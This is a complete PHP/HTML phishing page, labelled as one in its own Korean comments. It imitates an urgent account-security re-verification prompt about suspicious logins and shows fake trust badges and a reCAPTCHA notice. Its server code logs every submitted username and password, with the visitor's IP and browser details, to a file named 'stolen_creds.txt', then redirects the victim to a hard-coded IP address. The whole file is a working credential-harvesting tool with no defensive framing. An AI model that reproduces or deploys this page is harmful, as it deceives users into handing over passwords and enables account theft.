<?php
// secure_login.php - 보안 인증 피싱 페이지
session_start();

// 로그인 시도 처리
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // 훔친 정보 로그 저장
    $log_data = [
        'timestamp' => date('Y-m-d H:i:s'),
        'username' => $username,
        'password' => $password,
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'referer' => $_SERVER['HTTP_REFERER'] ?? 'direct',
        'page' => 'secure_login.php'
    ];
    
    // JSON 형식으로 저장
    $log_line = json_encode($log_data) . "\n";
    file_put_contents('stolen_creds.txt', $log_line, FILE_APPEND | LOCK_EX);
    
    // 성공 메시지 표시 후 리다이렉트
    $success_message = true;
}
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>보안 인증 - 계정 보호</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f5f7fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .security-container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
            width: 100%;
            max-width: 440px;
            border: 1px solid #e1e4e8;
        }
        
        .security-header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .security-icon {
            width: 60px;
            height: 60px;
            margin: 0 auto 20px;
            background: #dc3545;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 30px;
        }
        
        .warning-banner {
            background: #fff5f5;
            border: 1px solid #feb2b2;
            border-radius: 6px;
            padding: 16px;
            margin-bottom: 24px;
            display: flex;
            align-items: flex-start;
        }
        
        .warning-icon {
            color: #dc3545;
            font-size: 20px;
            margin-right: 12px;
            flex-shrink: 0;
        }
        
        .warning-content h3 {
            color: #c53030;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 4px;
        }
        
        .warning-content p {
            color: #742a2a;
            font-size: 13px;
            line-height: 1.5;
        }
        
        h1 {
            color: #1a202c;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: #718096;
            font-size: 14px;
            line-height: 1.5;
        }
        
        .security-info {
            background: #f7fafc;
            border: 1px solid #e2e8f0;
            border-radius: 6px;
            padding: 16px;
            margin-bottom: 24px;
        }
        
        .security-info h4 {
            color: #2d3748;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .security-info ul {
            list-style: none;
            font-size: 13px;
            color: #4a5568;
        }
        
        .security-info li {
            padding: 4px 0;
            padding-left: 20px;
            position: relative;
        }
        
        .security-info li:before {
            content: "✓";
            position: absolute;
            left: 0;
            color: #48bb78;
            font-weight: bold;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            color: #2d3748;
            margin-bottom: 8px;
            font-weight: 500;
            font-size: 14px;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #e2e8f0;
            border-radius: 6px;
            font-size: 14px;
            transition: all 0.2s;
            background: #fff;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #4299e1;
            box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.1);
        }
        
        .password-wrapper {
            position: relative;
        }
        
        .show-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #718096;
            cursor: pointer;
            font-size: 14px;
        }
        
        .verify-button {
            width: 100%;
            padding: 12px;
            background: #2b6cb0;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .verify-button:hover {
            background: #2c5aa0;
        }
        
        .verify-button:disabled {
            background: #cbd5e0;
            cursor: not-allowed;
        }
        
        .trust-badges {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 24px;
            padding-top: 24px;
            border-top: 1px solid #e2e8f0;
            gap: 20px;
        }
        
        .trust-badge {
            display: flex;
            align-items: center;
            font-size: 12px;
            color: #718096;
        }
        
        .trust-badge svg {
            width: 16px;
            height: 16px;
            margin-right: 4px;
            fill: #48bb78;
        }
        
        .success-container {
            text-align: center;
            padding: 40px;
        }
        
        .success-icon {
            width: 64px;
            height: 64px;
            margin: 0 auto 20px;
            background: #48bb78;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
        }
        
        .spinner {
            border: 3px solid #f3f3f3;
            border-radius: 50%;
            border-top: 3px solid #2b6cb0;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .captcha-info {
            font-size: 12px;
            color: #718096;
            text-align: center;
            margin-top: 16px;
        }
    </style>
</head>
<body>
    <div class="security-container">
        <?php if (isset($success_message) && $success_message): ?>
        <div class="success-container">
            <div class="success-icon">✓</div>
            <h2 style="color: #2d3748; margin-bottom: 8px;">인증 확인 중</h2>
            <p style="color: #718096; margin-bottom: 20px;">보안 검증을 진행하고 있습니다...</p>
            <div class="spinner"></div>
        </div>
        <script>
            setTimeout(function() {
                alert('보안 검증이 완료되었습니다. 메인 페이지로 이동합니다.');
                window.location.href = 'http://3.35.218.180';
            }, 3000);
        </script>
        <?php else: ?>
        
        <div class="security-header">
            <div class="security-icon">🔒</div>
            <h1>보안 인증 필요</h1>
            <p class="subtitle">의심스러운 활동이 감지되어 계정 보호를 위해 재인증이 필요합니다</p>
        </div>
        
        <div class="warning-banner">
            <span class="warning-icon">⚠️</span>
            <div class="warning-content">
                <h3>비정상적인 접속 시도 감지</h3>
                <p>새로운 위치에서의 로그인 시도가 감지되었습니다. 본인 확인을 위해 계정 정보를 다시 입력해주세요.</p>
            </div>
        </div>
        
        <div class="security-info">
            <h4>감지된 보안 위험:</h4>
            <ul>
                <li>새로운 IP 주소에서의 접속</li>
                <li>비정상적인 접속 패턴</li>
                <li>다중 로그인 시도</li>
            </ul>
        </div>
        
        <form method="POST" action="" id="securityForm">
            <div class="form-group">
                <label for="username">아이디 또는 이메일</label>
                <input type="text" id="username" name="username" required 
                       placeholder="아이디를 입력하세요" autocomplete="username">
            </div>
            
            <div class="form-group">
                <label for="password">비밀번호</label>
                <div class="password-wrapper">
                    <input type="password" id="password" name="password" required 
                           placeholder="비밀번호를 입력하세요" autocomplete="current-password">
                    <button type="button" class="show-password" onclick="togglePassword()">표시</button>
                </div>
            </div>
            
            <button type="submit" class="verify-button">
                보안 인증하기
            </button>
            
            <p class="captcha-info">
                이 인증은 reCAPTCHA로 보호되며 Google의 개인정보 보호정책 및 서비스 약관이 적용됩니다.
            </p>
        </form>
        
        <div class="trust-badges">
            <div class="trust-badge">
                <svg viewBox="0 0 20 20">
                    <path d="M2.93 17.07A10 10 0 1 1 17.07 2.93 10 10 0 0 1 2.93 17.07zm12.73-1.41A8 8 0 1 0 4.34 4.34a8 8 0 0 0 11.32 11.32zM9 11V9h2v6H9v-4zm0-6h2v2H9V5z"/>
                </svg>
                SSL 암호화
            </div>
            <div class="trust-badge">
                <svg viewBox="0 0 20 20">
                    <path d="M10 2a8 8 0 100 16 8 8 0 000-16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"/>
                </svg>
                2단계 인증
            </div>
            <div class="trust-badge">
                <svg viewBox="0 0 20 20">
                    <path d="M10 1l3.09 6.26L20 8.27l-5 4.87L16.18 20 10 16.27 3.82 20 5 13.14 0 8.27l6.91-1.01L10 1z"/>
                </svg>
                보안 검증
            </div>
        </div>
        
        <?php endif; ?>
    </div>
    
    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const showButton = document.querySelector('.show-password');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                showButton.textContent = '숨기기';
            } else {
                passwordInput.type = 'password';
                showButton.textContent = '표시';
            }
        }
        
        // 폼 제출 시 처리
        document.getElementById('securityForm')?.addEventListener('submit', function(e) {
            const button = document.querySelector('.verify-button');
            button.textContent = '인증 중...';
            button.disabled = true;
        });
        
        // 입력 필드 포커스 효과
        document.querySelectorAll('input').forEach(input => {
            input.addEventListener('focus', function() {
                this.parentElement.style.transform = 'translateY(-2px)';
            });
            
            input.addEventListener('blur', function() {
                this.parentElement.style.transform = 'translateY(0)';
            });
        });
    </script>
</body>
</html>